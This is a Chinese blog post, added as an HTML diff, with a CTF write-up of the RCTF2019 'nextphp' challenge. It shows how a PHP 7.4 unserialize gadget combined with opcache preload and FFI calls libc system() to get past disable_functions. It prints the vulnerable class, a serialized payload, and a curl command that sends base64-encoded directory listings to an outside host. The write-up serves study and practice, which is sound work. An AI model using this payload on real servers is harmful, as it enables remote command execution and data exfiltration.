@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <title>RCTF2019-nextphp - Sla，当你走了，我发誓不会堕落</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/images/avatar.png" type="image/png" />
+  <meta name="description" content="一道考察PHP7.4新特性的题目。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF2019-nextphp">
+<meta property="og:url" content="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;eb3c7b7e.html">
+<meta property="og:site_name" content="Sla，当你走了，我发誓不会堕落">
+<meta property="og:description" content="一道考察PHP7.4新特性的题目。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;nextphp&#x2F;nextphp&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;nextphp&#x2F;nextphp&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;nextphp&#x2F;nextphp&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;nextphp&#x2F;nextphp&#x2F;4.png">
+<meta property="article:published_time" content="2020-01-06T12:54:03.479Z">
+<meta property="article:modified_time" content="2020-01-06T16:35:44.382Z">
+<meta property="article:author" content="Stao">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;nextphp&#x2F;nextphp&#x2F;1.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1578330154619">
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Stao" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Stao">
+            <img src="/images/avatar.png" alt="Stao">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>7</div>
+        <div><span>标签</span>8</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/ctfer-Stao" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/web/">web</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/readflag/" style="font-size: 10px;">readflag</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xxe/" style="font-size: 13.33px;">xxe</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.67px;">命令执行</a>
+    </div>
+    
+  </div>
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 Stao
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1578338471119&di=81128fb5b6a011d86841df2f78ba64bf&imgtype=0&src=http%3A%2F%2Fdpic.tiankong.com%2Flp%2Fgg%2FQJ8914992754.jpg">
+        
+        <h1>RCTF2019-nextphp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年01月06日</a>
+    <a><i class="nexmoefont icon-areachart"></i>908 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/web/" rel="tag">web</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    
+  </div>
+  <article>
+    <p>一道考察PHP7.4新特性的题目。</p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学绕过disable_functions,刚好这道题有考到这个知识点，所以复现学习下。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>参考：<br><a href="https://github.com/CTFTraining/rctf_2019_nextphp/tree/4e4879607a25122e3d4ebe905c8a70cd8a25db89" target="_blank" rel="noopener">https://github.com/CTFTraining/rctf_2019_nextphp/tree/4e4879607a25122e3d4ebe905c8a70cd8a25db89</a></p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>打开网页，题目直接给出源码，查看phpinfo(),发现禁用了很多函数，包括mail,error_log.也没有安装Imagetragick 所以想用传统的bypass显然不行。<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/nextphp/nextphp/1.png" alt=""><br>利用scandir和readfile查看一下源码。<br>preload.php</p>
+<pre><code>&lt;?php
+final class A implements Serializable {
+protected $data = [
+    &apos;ret&apos; =&gt; null,
+    &apos;func&apos; =&gt; &apos;print_r&apos;,
+    &apos;arg&apos; =&gt; &apos;1&apos;
+];
+
+private function run () {
+    $this-&gt;data[&apos;ret&apos;] = $this-&gt;data[&apos;func&apos;]($this-&gt;data[&apos;arg&apos;]);
+}
+
+public function __serialize(): array {
+    return $this-&gt;data;
+}
+
+public function __unserialize(array $data) {
+    array_merge($this-&gt;data, $data);
+    $this-&gt;run();
+}
+
+public function serialize (): string {
+    return serialize($this-&gt;data);
+}
+
+public function unserialize($payload) {
+    $this-&gt;data = unserialize($payload);
+    $this-&gt;run();
+}
+
+public function __get ($key) {
+    return $this-&gt;data[$key];
+}
+
+public function __set ($key, $value) {
+    throw new \Exception(&apos;No implemented&apos;);
+}
+
+public function __construct () {
+    throw new \Exception(&apos;No implemented&apos;);
+}
+}</code></pre><p>代码使用了PHP7.4 提出了两个新的序列化接口：__serialize()/ __unserialize()。也有之前就已经有的序列化接口，在同时拥有两种序列化接口的时候，PHP7.4 会优先使用新版本的接口。</p>
+<p>继续查看phpinfo()</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/nextphp/nextphp/2.png" alt=""></p>
+<p>发现 opcache.preload。</p>
+<h2 id="预加载"><a href="#预加载" class="headerlink" title="预加载"></a>预加载</h2><p><a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a></p>
+<p>在 PHP7.4 中，php.ini 有一个新指令 opcache.preload，这个指令可以用来预加载一个 PHP 文件，被预加载的 PHP 文件将被执行，并永远缓存在 opcache 内存中。通过在该 PHP 文件中包含，或者使用 opcache_compile_file 函数的方式，我们可以将其他 PHP 文件或者整个框架都预加载到 opcache 内存中。</p>
+<p>而且开启了FFI<br><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/nextphp/nextphp/3.png" alt=""></p>
+<h2 id="外部函数接口FFI"><a href="#外部函数接口FFI" class="headerlink" title="外部函数接口FFI"></a>外部函数接口FFI</h2><p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a></p>
+<p>这个特性就是说允许你在php中调用C代码。当然，在默认配置下，我们只能在预加载的php文件中使用FFI，但是PHP FFI API限制仅对FFI类有效，对FFI\CData对象的重载函数无效。也就是说，我们可以在预加载文件中生成一些FFI\CData对象，然后再通过我们的代码来调用</p>
+<p>所以这道题的解法就是，在预加载文件中使用FFI，将返回的FFI对象给webshell使用。preload.php自定义了反序列化的方法，在方法中调用run函数，我们可以通过run函数来生成FFI对象。</p>
+<p>FFI的例子：</p>
+<pre><code>&lt;?php
+// create FFI object, loading libc and exporting function printf()
+$ffi = FFI::cdef(
+    &quot;int printf(const char *format, ...);&quot;, // this is     regular C declaration
+&quot;libc.so.6&quot;);
+// call C printf()
+$ffi-&gt;printf(&quot;Hello %s!\n&quot;, &quot;world&quot;);</code></pre><p>第二个参数，也就是 lib 的文件名空着也可以调用C的库函数。</p>
+<p>构造序列化对象：</p>
+<pre><code>&lt;?php
+final class A implements Serializable {
+protected $data = [
+    &apos;ret&apos; =&gt; null,
+    &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,
+    &apos;arg&apos; =&gt; &apos;int system(const char *command);&apos;
+];
+
+  public function serialize (): string {
+    return serialize($this-&gt;data);
+}
+
+public function unserialize($payload) {
+    $this-&gt;data = unserialize($payload);
+    $this-&gt;run();
+}
+}
+
+$a=new A();
+echo serialize($a);
+?&gt;
+//C:1:&quot;A&quot;:95:{a:3:{s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;}}</code></pre><p>payload:</p>
+<pre><code>$a=unserialize(&apos;C:1:&quot;A&quot;:95:{a:3:{s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;}}&apos;);$a-&gt;ret-&gt;system(&apos;curl ip/`ls|base64`&apos;);</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/nextphp/nextphp/4.png" alt=""></p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这道题主要考察了PHP7.4的三个新特性。考察了一种新的bypass disable_functions的方法。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/5218" target="_blank" rel="noopener">https://xz.aliyun.com/t/5218</a></p>
+<p><a href="https://aluvion.github.io/2019/05/25/RCTF2019-Web-nextphp%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://aluvion.github.io/2019/05/25/RCTF2019-Web-nextphp%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0/</a></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Stao<br>
+<strong>本文链接：</strong><a href="http://stao.site/posts/eb3c7b7e.html" title="http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;eb3c7b7e.html" target="_blank" rel="noopener">http:&#x2F;&#x2F;stao.site&#x2F;posts&#x2F;eb3c7b7e.html</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <div class="valine"></div>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.9/dist/Valine.min.js'></script>
+<script>
+    // 使用方法 https://valine.js.org/quickstart.html
+    new Valine({
+        el: '.valine',
+        appId: 'U6bjcH3nqE46nXLkozomi6Fq-gzGzoHsz',
+        appKey: 'gXsdLMIoOKAg7tcJ8a76J02l'
+    })
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1578330154631"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
